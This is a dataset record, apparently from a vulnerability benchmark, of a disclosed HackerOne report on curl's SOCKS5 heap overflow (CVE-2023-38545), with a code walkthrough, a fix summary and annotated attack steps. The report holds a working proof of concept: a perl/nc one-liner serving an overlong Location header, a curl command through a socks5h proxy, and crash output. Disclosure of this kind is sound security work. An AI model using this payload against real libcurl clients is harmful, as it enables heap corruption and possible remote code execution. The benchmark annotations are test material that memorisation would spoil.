{
  "reported_to": "curl",
  "reported_by": "raysatiro ",
  "title": "CVE-2023-38545: socks5 heap buffer overflow",
  "content": "\nSummary:\nThe SOCKS5 state machine can be manipulated by a remote attacker to overflow heap memory if four conditions are met:\nThe request is made via socks5h.\nThe state machine's negotiation buffer is smaller than ~65k.\nThe SOCKS server's \"hello\" reply is delayed.\nThe attacker sets a final destination hostname larger than the negotiation buffer.\nlibcurl is supposed to disable SOCKS5 remote hostname resolution for hostnames larger than 255 but will not due to a state machine bug.\nFor example tor user running libcurl app with follow location that connects to rogue onion server that replies with payload in Location: header which causes crash or worse.\nWalkthrough:\ndo_SOCKS initializes local variable socks5_resolve_local depending on the CURLPROXY_ name. There are two relevant names for this state machine:\nCURLPROXY_SOCKS5 (SOCKS5 with local resolve of dest host)\nCURLPROXY_SOCKS5_HOSTNAME (SOCKS5 with remote resolve of dest host)\nCode:\nCode 99 Bytes\n1  bool socks5_resolve_local =\n2    (conn->socks_proxy.proxytype == CURLPROXY_SOCKS5) ? TRUE : FALSE;\nFor this scenario, CURLPROXY_SOCKS5_HOSTNAME is the name and socks5_resolve_local is initialized FALSE.\nThe do_SOCKS state machine is entered for the first time for the connection. sx->state is CONNECT_SOCKS_INIT (which happens to be the first label). In that state the hostname length is checked and if too long to resolve remotely (>255) then it sets socks5_resolve_local to TRUE.\nCode:\nCode 304 Bytes\n1    /* RFC1928 chapter 5 specifies max 255 chars for domain name in packet */\n2    if(!socks5_resolve_local && hostname_len > 255) {\n3      infof(data, \"SOCKS5: server resolving disabled for hostnames of \"\n4            \"length > 255 [actual len=%zu]\", hostname_len);\n5      socks5_resolve_local = TRUE;\n6    }\nThe local variable socks5_resolve_local is changed but, because this is a state machine, subsequent calls to do_SOCKS are in a different state and do not make the same change. This is the bug.\nFor this scenario, the hostname is longer than 255 characters and do_SOCKS is on a subsequent call, which means socks5_resolve_local remains FALSE. This can happen by chance or be forced by an attacker.\nThe client \"hello\" SOCKS packet contains available methods and is sent to the server. State CONNECT_SOCKS_READ_INIT => CONNECT_SOCKS_READ is entered to parse the server \"hello\" packet (method selection reply). The server has not yet replied so do_SOCKS returns CURLPX_OK.\nCode:\nCode 785 Bytes\n1CONNECT_SOCKS_READ_INIT:\n2  case CONNECT_SOCKS_READ_INIT:\n3    sx->outstanding = 2; /* expect two bytes */\n4    sx->outp = socksreq; /* store it here */\n5    /* FALLTHROUGH */\n6  case CONNECT_SOCKS_READ:\n7    presult = socks_state_recv(cf, sx, data, CURLPX_RECV_CONNECT,\n8                               \"initial SOCKS5 response\");\n9    if(CURLPX_OK != presult)\n10      return presult;\n11    else if(sx->outstanding) {\n12      /* remain in reading state */\n13      return CURLPX_OK;\n14    }\n15    else if(socksreq[0] != 5) {\n16      failf(data, \"Received invalid version in initial SOCKS5 response.\");\n17      return CURLPX_BAD_VERSION;\n18    }\n19    else if(socksreq[1] == 0) {\n20      /* DONE! No authentication needed. Send request. */\n21      sxstate(sx, data, CONNECT_REQ_INIT);\n22      goto CONNECT_REQ_INIT;\n23    }\nOn a subsequent call do_SOCKS is in the same state where it's waiting for the initial server reply. If the reply is valid, and in this scenario it is, then the state machine will goto CONNECT_REQ_INIT which will goto CONNECT_RESOLVE_REMOTE since socks5_resolve_local is FALSE.\nCode:\nCode 498 Bytes\n1CONNECT_REQ_INIT:\n2  case CONNECT_REQ_INIT:\n3    if(socks5_resolve_local) {\n4      enum resolve_t rc = Curl_resolv(data, sx->hostname, sx->remote_port,\n5                                      TRUE, &dns);\n6\n7      if(rc == CURLRESOLV_ERROR)\n8        return CURLPX_RESOLVE_HOST;\n9\n10      if(rc == CURLRESOLV_PENDING) {\n11        sxstate(sx, data, CONNECT_RESOLVING);\n12        return CURLPX_OK;\n13      }\n14      sxstate(sx, data, CONNECT_RESOLVED);\n15      goto CONNECT_RESOLVED;\n16    }\n17    goto CONNECT_RESOLVE_REMOTE;\nIn CONNECT_RESOLVE_REMOTE the hostname is copied into the socksreq buffer. The code assumes the hostname is <= 255 characters which as discussed above is not guaranteed.\nCode:\nCode 339 Bytes\n1      else {\n2        socksreq[len++] = 3;\n3        socksreq[len++] = (char) hostname_len; /* one byte address length */\n4        memcpy(&socksreq[len], sx->hostname, hostname_len); /* w/o NULL */\n5        len += hostname_len;\n6      }\n7      infof(data, \"SOCKS5 connect to %s:%d (remotely resolved)\",\n8            sx->hostname, sx->remote_port);\nsocksreq points to the temporary download buffer (ie data->state.buffer) which was repurposed to send/receive the SOCKS negotiation since the transfer is not yet downloading.\nIf the size of the hostname exceeds the remaining size of the buffer then there is a buffer overflow. If the size of the hostname maxes out but does not exceed the remaining size then there is an overflow when the buffer is next written to.\nRegardless, at this point we know from checks beforehand that hostname length is shorter than 65535 (MAX_URL_LEN) and the full size of buffer is at least data->set.buffer_size + 1.\nCode:\nCode 162 Bytes\n1  else if(strlen(data->state.up.hostname) > MAX_URL_LEN) {\n2    failf(data, \"Too long host name (maximum is %d)\", MAX_URL_LEN);\n3    return CURLE_URL_MALFORMAT;\n4  }\nCode:\nCode 138 Bytes\n1CURLcode Curl_preconnect(struct Curl_easy *data)\n2{\n3  if(!data->state.buffer) {\n4    data->state.buffer = malloc(data->set.buffer_size + 1);\ndata->set.buffer_size varies. Before the allocation above, libcurl has set data->set.buffer_size to a default 16384 (see READBUFFER_SIZE aka CURL_MAX_WRITE_SIZE) which could have been overridden by the user via CURLOPT_BUFFERSIZE. A significant example of this is the curl tool uses CURLOPT_BUFFERSIZE to set the size to its own default 102400, or user setting from --limit-rate if that value is smaller than 100k.\nThe two buffer size configurations that are likely widely used are 16384+1 for libcurl apps without CURLOPT_BUFFERSIZE and 102400+1 for curl tool commands without a low --limit-rate. For the former the buffer can be overflowed and for the latter it can't: 16384+1 < 65535 < 102400+1.\nThe characters that are allowed for hostname depend on if libcurl was built with IDN support. If it was built with IDN support then as long as the hostname contains characters < 0x80 no IDN conversion is attempted. For the higher value characters it seems very unlikely they would pass through but would depend on the IDN library. Without IDN support the characters pass through. For example Location: http://\\xff\\r\\n will pass through without IDN.\nCode:\nCode 309 Bytes\n1bool Curl_is_ASCII_name(const char *hostname)\n2{\n3  /* get an UNSIGNED local version of the pointer */\n4  const unsigned char *ch = (const unsigned char *)hostname;\n5\n6  if(!hostname) /* bad input, consider it ASCII! */\n7    return TRUE;\n8\n9  while(*ch) {\n10    if(*ch++ & 0x80)\n11      return FALSE;\n12  }\n13  return TRUE;\n14}\nCode:\nCode 193 Bytes\n1#ifdef USE_IDN\n2  /* Check name for non-ASCII and convert hostname if we can */\n3  if(!Curl_is_ASCII_name(host->name)) {\n4    char *decoded;\n5    CURLcode result = idn_decode(host->name, &decoded);\nSteps To Reproduce:\nThe attacker needs to control the hostname. For example, the user has set CURLOPT_FOLLOWLOCATION (--location for the curl tool) so that libcurl will follow redirects. The attacker would need control of the hostname in the location header.\nThe attacker needs the state machine to be delayed, as discussed earlier. For example, the attacker controls the SOCKS server and delays the initial server hello.\nThe attacker probably needs to know how large data->set.buffer_size is and how the memory is typically allocated, like what comes after data->state.buffer in the heap. For example, the attacker has a copy of the program that is using libcurl and can debug it in a similar environment.\nSupporting Material/References:\nCode 120 Bytes\n1Unhandled exception at 0x6e1557be (libcurld.dll) in curld.exe: 0xC0000005: Access violation reading location 0x41414141.\nRefer to attached screenshot Capture.PNG.\nCode 88 Bytes\n1HEAP[curld.exe]: Heap block at 005F8200 modified at 005FC22D past requested size of 4025\nNote 4025 is in hex, in decimal it is 16421 which is 16384+1+heap guard bytes.\nCode 194 Bytes\n1while true; do { perl -e 'print (\"HTTP/1.1 301 Moved\\r\\nContent-Length: 0\\r\\nConnection: Close\\r\\nLocation: http://\");print(\"A\"x65535);print(\"\\r\\n\\r\\n\")'; sleep 2; } | nc -4l [yourip] 8000; done\nstart a socks5 server on remoteip (for the latency) and run curl repeatedly until it reads from 0x41414141 (AAAAA....)\nCode 92 Bytes\n1curl -v --limit-rate 16384 --location --proxy socks5h://[remoteip]:1080 http://[yourip]:8000\nif making the socks server remote doesn't work for latency you'd have to modify its source or force it via libcurl source\nCode 241 Bytes\n1   case CONNECT_SOCKS_READ:\n2+    {\n3+      static bool x = 0;\n4+      if(++x == 2)\n5+        return CURLPX_OK;\n6+    }\n7     presult = socks_state_recv(cf, sx, data, CURLPX_RECV_CONNECT,\n8                                \"initial SOCKS5 response\");\nSolution\nRefer to attached patch curl_security_fix.patch. It fixes the issue by changing the remote resolve check to return error CURLPX_LONG_HOSTNAME if dest host is larger than 255.\nImpact\nImpact\nIf the state machine is not delayed and works as intended then the resolution is made locally, which in my opinion a privacy violation because a local DNS query could possibly deanonymize a user who specifically requests socks5h. In my solution patch I do not allow it.\nIf the state machine is delayed then the resolution is made remotely with a malformed SOCKS packet. The attacker has written to the heap and likely overwritten in-use data that come after data->state.buffer. It's undefined behavior at best and possible RCE at worst.\nI think if libcurl was built with IDN support then the worst case is much harder to achieve because only certain bytes can be in the hostname.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 0,
  "weaknesses": [
    "Heap Overflow"
  ],
  "screenshots": {},
  "disclosed_date": 1697020680,
  "report_url": "https://hackerone.com/reports/2187833",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Set up a rogue SOCKS5 server that delays its initial 'hello' reply"
    ],
    [
      2,
      "Create a malicious HTTP server that responds with a redirect (Location header) containing a hostname longer than 255 characters (preferably close to 65k for maximum impact)"
    ],
    [
      3,
      "Configure the victim to use the rogue SOCKS5 server as a proxy (socks5h://)"
    ],
    [
      4,
      "Make the victim application (using libcurl) follow the malicious redirect with CURLOPT_FOLLOWLOCATION enabled"
    ]
  ],
  "vuln_description": "A heap buffer overflow vulnerability in libcurl's SOCKS5 proxy handling when resolving hostnames remotely. The flaw occurs when: 1) Using socks5h proxy configuration, 2) The negotiation buffer is smaller than ~65k, 3) The SOCKS server delays its hello reply, and 4) The hostname exceeds 255 characters. This allows heap memory corruption which could lead to crashes or remote code execution.",
  "reason": "This vulnerability requires deep understanding of: 1) libcurl's SOCKS5 state machine implementation, 2) The subtle timing condition where the server delays its response, 3) The buffer size calculations and memory layout, and 4) The non-obvious interaction between hostname length checks and the state machine persistence. The attacker must also control both the redirect hostname and the proxy server behavior.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}